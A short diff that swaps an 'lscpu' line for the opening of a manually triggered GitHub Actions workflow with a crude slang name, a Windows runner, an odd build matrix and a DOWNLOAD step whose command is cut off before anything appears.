@@ -1,1 +1,20 @@
-lscpu
+name: kontol  
+   
+on: [workflow_dispatch]  
+   
+jobs:  
+  build:  
+    name: kontol  
+    runs-on: windows-latest  
+    strategy:  
+      max-parallel: 1  
+      fail-fast: false  
+      matrix:  
+        go: [1.0]  
+        flag: [A, B ]  
+    env:  
+        NUM_JOBS: 5  
+        JOB: ${{ matrix.go }}  
+    steps:  
+    - name: DOWNLOAD  
+      run:
